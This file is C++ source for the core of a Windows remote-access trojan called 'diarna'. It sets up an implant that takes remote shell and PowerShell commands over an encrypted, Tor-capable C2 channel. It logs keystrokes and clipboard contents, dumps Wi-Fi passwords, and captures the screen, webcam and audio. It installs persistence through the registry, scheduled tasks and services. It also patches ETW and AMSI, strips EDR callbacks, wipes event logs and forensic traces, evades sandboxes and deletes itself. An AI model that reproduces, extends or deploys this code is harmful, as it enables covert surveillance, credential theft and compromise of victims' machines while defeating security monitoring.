#include <diarna/compiler_port.hpp>
#include <diarna/core/framework.hpp>
#include <diarna/exec/executor.hpp>
#include <wlanapi.h>
#include <setupapi.h>
#include <devguid.h>
#include <obfuscation/obfusheader.h>

DIARNA_LINK_LIB("wlanapi.lib")
DIARNA_LINK_LIB("setupapi.lib")

namespace diarna {

DiarnaFramework::DiarnaFramework(Config config) : config_(std::move(config)) {}
DiarnaFramework::~DiarnaFramework() { stand_down(); }

bool DiarnaFramework::arm() {
    INDIRECT_BRANCH;

    if (!verify_environment()) {
        stealth::AntiAnalysis::instance().exit_stealthy();
        return false;
    }

    if (!check_environment_key())
        return false;

    apply_stealth();

    crypto_ = std::make_unique<crypto::ChaCha20Poly1305>(
        std::span<const uint8_t, 32>(config_.encryption_key));

    auto& poly = stealth::PolymorphicEngine::instance();
    poly.initialize((uint32_t)__rdtsc());
    poly.set_mutation_interval(std::chrono::milliseconds(5000 + (__rdtsc() % 11000)));

    auto& gate = stealth::HellsGate::instance();
    gate.initialize();

    auto& nanomite = stealth::NanomiteEngine::instance();
    nanomite.install_traps();

    auto& rop = stealth::ROPEngine::instance();
    rop.initialize();

    auto& kernel = stealth::KernelOperations::instance();
    kernel.initialize();
    kernel.remove_all_edr_callbacks();

    auto& peb = stealth::PebMirror::instance();
    if (peb.initialize()) peb.install_mirror();

    if (config_.comm.tor.enabled && config_.comm.tor.embedded)
        comm::TorEmbeddedClient::instance().initialize();

    persistence_ = std::make_unique<persistence::PersistenceManager>(config_.persistence);
    keylogger_ = std::make_unique<collection::Keylogger>();
    clipboard_ = std::make_unique<collection::ClipboardMonitor>();
    credentials_ = std::make_unique<collection::CredentialDumper>();
    harvester_ = std::make_unique<collection::CredentialHarvester>();
    movement_ = std::make_unique<movement::LateralMovement>();
    screenshot_ = std::make_unique<capture::Screenshot>();
    audio_ = std::make_unique<capture::Audio>();
    webcam_ = std::make_unique<capture::Webcam>();
    webrtc_ = std::make_unique<capture::WebRTCStreamer>();
    desktop_ = std::make_unique<capture::DesktopDuplicator>();
    protocol_ = std::make_unique<comm::C2Protocol>();
    protocol_->set_encryption_key(std::span<const uint8_t, 32>(config_.encryption_key));
    protocol_->set_session_magic(config_.agent_id, std::span<const uint8_t, 8>(config_.encryption_key.data(), 8));

    protocol_->set_handler([this](diarna::comm::CommandType cmd, std::span<const uint8_t> payload) -> std::vector<uint8_t> {
        switch (cmd) {
            case diarna::comm::CommandType::EXEC_CMD: {
                std::string c(payload.begin(), payload.end());
                auto r = diarna::exec::Executor().execute(c);
                std::string resp = r.stdout_data + "\n" + r.stderr_data;
                return {resp.begin(), resp.end()};
            }
            case diarna::comm::CommandType::EXEC_PS: {
                std::string s(payload.begin(), payload.end());
                auto r = diarna::exec::Executor().execute_powershell(s);
                return {r.stdout_data.begin(), r.stdout_data.end()};
            }
            case diarna::comm::CommandType::SYSINFO: {
                auto si = status();
                std::string info = si.agent_id + " up=" + std::to_string(si.uptime_sec) + "s";
                return {info.begin(), info.end()};
            }
            case diarna::comm::CommandType::SCREENSHOT: {
                if (screenshot_) { auto jpg = screenshot_->capture_jpeg(85); return jpg; }
                return {};
            }
            case diarna::comm::CommandType::KEYLOG_DUMP: {
                if (keylogger_) { auto k = keylogger_->get_logs(); return {k.begin(), k.end()}; }
                return {};
            }
            case diarna::comm::CommandType::CLIPBOARD_DUMP: {
                if (clipboard_) { auto cb = clipboard_->get_last_clipboard(); return {cb.begin(), cb.end()}; }
                return {};
            }
            case diarna::comm::CommandType::CREDS_DUMP: {
                if (credentials_) {
                    auto wifi = credentials_->dump_wifi_passwords();
                    std::string out;
                    for (auto& w : wifi) out += w + "\n";
                    return {out.begin(), out.end()};
                }
                return {};
            }
            case diarna::comm::CommandType::PERSIST_INSTALL: {
                if (persistence_) { bool ok = persistence_->install(); std::string r = ok ? "installed" : "failed"; return {r.begin(), r.end()}; }
                return {};
            }
            case diarna::comm::CommandType::PERSIST_REMOVE: {
                if (persistence_) { bool ok = persistence_->uninstall(); std::string r = ok ? "removed" : "failed"; return {r.begin(), r.end()}; }
                return {};
            }
            case diarna::comm::CommandType::PERSIST_STATUS: {
                if (persistence_) {
                    std::string r;
                    for (auto m : {diarna::persistence::Method::RegistryRun, diarna::persistence::Method::ScheduledTask, diarna::persistence::Method::WindowsService, diarna::persistence::Method::StartupFolder})
                        r += persistence_->is_installed(m) ? "1" : "0";
                    return {r.begin(), r.end()};
                }
                return {};
            }
            case diarna::comm::CommandType::SELF_DESTRUCT: {
                if (persistence_) persistence_->uninstall();
                diarna::stealth::EvasionEngine::instance().clear_event_logs();
                diarna::stealth::EvasionEngine::instance().self_delete();
                active_ = false;
                return {};
            }
            case diarna::comm::CommandType::SLEEP: {
                if (!payload.empty()) { uint32_t sec = *(uint32_t*)payload.data(); Sleep(sec * 1000); }
                return {};
            }
            default: return {};
        }
    });

    armed_ = true;
    return true;
}

bool DiarnaFramework::deploy() {
    if (!armed_ || active_) return false;
    deploy_persistence();
    if (config_.collection.keylogger) keylogger_->start();
    if (config_.collection.clipboard) clipboard_->start(std::chrono::seconds(2));
    active_ = true;
    start_time_ = std::chrono::steady_clock::now();
    main_thread_ = std::thread(&DiarnaFramework::main_loop, this);
    return true;
}

void DiarnaFramework::stand_down() {
    active_ = false;
    if (main_thread_.joinable()) main_thread_.join();
    if (keylogger_) keylogger_->stop();
    if (clipboard_) clipboard_->stop();
    if (persistence_) persistence_->uninstall();
    comm::TorEmbeddedClient::instance().shutdown();
    stealth::NanomiteEngine::instance().remove_traps();
    stealth::PebMirror::instance().remove_mirror();
    if (config_.stealth.clear_logs)
        stealth::EvasionEngine::instance().clear_event_logs();
}

bool DiarnaFramework::is_active() const { return active_; }

collection::Keylogger& DiarnaFramework::keylogger() { return *keylogger_; }
collection::ClipboardMonitor& DiarnaFramework::clipboard() { return *clipboard_; }
collection::CredentialDumper& DiarnaFramework::credentials() { return *credentials_; }
collection::CredentialHarvester& DiarnaFramework::harvester() { return *harvester_; }
movement::LateralMovement& DiarnaFramework::movement() { return *movement_; }
comm::ReverseShell& DiarnaFramework::shell() { return *shell_; }
capture::Screenshot& DiarnaFramework::screenshot() { return *screenshot_; }
capture::Audio& DiarnaFramework::audio() { return *audio_; }
capture::Webcam& DiarnaFramework::webcam() { return *webcam_; }
capture::WebRTCStreamer& DiarnaFramework::webrtc() { return *webrtc_; }
capture::DesktopDuplicator& DiarnaFramework::desktop() { return *desktop_; }

DiarnaFramework::Status DiarnaFramework::status() const {
    Status s;
    s.agent_id = config_.agent_id;
    s.is_active = active_;
    s.c2_connected = false;
    s.tor_ready = comm::TorEmbeddedClient::instance().is_ready();
    s.uptime_sec = (uint64_t)std::chrono::duration_cast<std::chrono::seconds>(
        std::chrono::steady_clock::now() - start_time_).count();
    s.vault_pages = stealth::MemoryVault::instance().page_count();
    s.vault_accesses = stealth::MemoryVault::instance().access_count();
    s.mutations_total = stealth::PolymorphicEngine::instance().stats().mutations_performed;
    s.injections_successful = exec::ProcessInjector::instance().stats().successful;
    s.rop_gadgets = stealth::ROPEngine::instance().stats().total_gadgets;
    s.nanomite_traps = stealth::NanomiteEngine::instance().is_emulated() ? 0 : 7;
    s.peb_mirrored = stealth::PebMirror::instance().is_mirroring();
    s.kernel_callbacks_removed = 0;

    if (persistence_) {
        for (auto m : {persistence::Method::RegistryRun, persistence::Method::ScheduledTask,
                       persistence::Method::WindowsService, persistence::Method::StartupFolder}) {
            if (persistence_->is_installed(m)) {
                s.active_persistence.push_back(m == persistence::Method::RegistryRun ? "registry" :
                    m == persistence::Method::ScheduledTask ? "sched_task" :
                    m == persistence::Method::WindowsService ? "service" : "startup");
            }
        }
    }
    if (config_.stealth.patch_etw) s.evasion_active.push_back("etw");
    if (config_.stealth.patch_amsi) s.evasion_active.push_back("amsi");
    if (config_.stealth.unlink_peb) s.evasion_active.push_back("peb_unlinked");
    if (config_.persistence.hide_taskmgr) s.evasion_active.push_back("taskmgr_hidden");
    if (config_.persistence.mask_pid) s.evasion_active.push_back("pid_masked");

    auto analysis = stealth::AntiAnalysis::instance().full_scan();
    s.sandbox_detection = analysis.is_sandboxed ? analysis.sandbox_name : "none";
    return s;
}

void DiarnaFramework::main_loop() {
    auto& poly = stealth::PolymorphicEngine::instance();
    auto& vault = stealth::MemoryVault::instance();
    auto& antihook = stealth::AntiHook::instance();
    auto& evasion = stealth::EvasionEngine::instance();
    auto& gate = stealth::HellsGate::instance();
    auto& nanomite = stealth::NanomiteEngine::instance();
    auto& kernel = stealth::KernelOperations::instance();

    auto last_persist = std::chrono::steady_clock::now();
    auto last_mutation = std::chrono::steady_clock::now();
    auto last_syscall = std::chrono::steady_clock::now();
    auto last_heartbeat = std::chrono::steady_clock::now();

    while (active_) {
        auto now = std::chrono::steady_clock::now();

        vault.cycle_reencrypt();

        if (now - last_mutation > std::chrono::seconds(5 + (__rdtsc() % 11))) {
            poly.mutate_all_active();
            last_mutation = now;
        }

        if (config_.daemonize && now - last_persist > std::chrono::seconds(60)) {
            if (!persistence_->is_installed(persistence::Method::RegistryRun) &&
                !persistence_->is_installed(persistence::Method::ScheduledTask) &&
                !persistence_->is_installed(persistence::Method::WindowsService) &&
                !persistence_->is_installed(persistence::Method::StartupFolder)) {
                persistence_->install();
            }
            last_persist = now;
        }

        if (now - last_syscall > std::chrono::minutes(30)) {
            gate.randomize_all_stubs();
            last_syscall = now;
        }

        auto hooks = antihook.scan_all_critical();
        if (!hooks.empty()) {
            antihook.unhook_ntdll();
            evasion.patch_etw();
            evasion.patch_amsi();
        }

        if (nanomite.is_emulated()) {
            stealth::AntiAnalysis::instance().exit_stealthy();
        }

        if (config_.comm.kill_date_enabled || now - last_heartbeat > std::chrono::hours(72)) {
            if (persistence_) persistence_->uninstall();
            stealth::EvasionEngine::instance().clear_event_logs();
            stealth::EvasionEngine::instance().clear_prefetch();
            stealth::EvasionEngine::instance().self_delete();
            active_ = false;
        }

        static uint64_t defcnt = 0;
        if (++defcnt % 500 == 0) {
            kernel.remove_all_edr_callbacks();
            if (config_.stealth.clear_logs) evasion.clear_event_logs();
        }

        DWORD sl = 15000 + (DWORD)(__rdtsc() % 30001);
        for (DWORD i = 0; i < sl && active_; i += 100)
            Sleep(100);
    }
}

void DiarnaFramework::apply_stealth() {
    auto& evasion = stealth::EvasionEngine::instance();
    auto& antihook = stealth::AntiHook::instance();

    if (config_.stealth.patch_etw) evasion.patch_etw();
    if (config_.stealth.patch_amsi) evasion.patch_amsi();
    if (config_.stealth.unlink_peb) evasion.unlink_from_peb();
    if (config_.persistence.hide_taskmgr) evasion.hide_from_task_manager();
    if (config_.persistence.mask_pid) evasion.mask_process_pid();
    if (config_.persistence.critical_process) evasion.clear_peb_debug_flag();
    if (config_.stealth.anti_hook) { antihook.unhook_ntdll(); evasion.unhook_loaded_dlls(); }
    if (config_.stealth.clear_recent) evasion.clear_recent_files();
    if (config_.stealth.clear_logs) evasion.clear_event_logs();
    evasion.block_dll_notification();
    evasion.morph_process_name();
    evasion.clear_mui_cache();
    evasion.clear_bam_key();
    evasion.clear_shimcache();
}

void DiarnaFramework::deploy_persistence() {
    if (!config_.daemonize) return;
    persistence_->guard_process();
    persistence_->install();
}

bool DiarnaFramework::verify_environment() {
    auto& aa = stealth::AntiAnalysis::instance();
    if (config_.stealth.anti_vm && aa.is_virtual_machine())
        { if (config_.stealth.behave_defensively) aa.behave_defensively(); return false; }
    if (config_.stealth.anti_debug && aa.is_debugger_present())
        { aa.exit_stealthy(); return false; }
    if (config_.stealth.anti_anyrun && aa.is_any_run())
        { aa.exit_stealthy(); return false; }
    if (config_.stealth.anti_sandbox && aa.full_scan().is_sandboxed)
        { aa.exit_stealthy(); return false; }
    return true;
}

} // namespace diarna
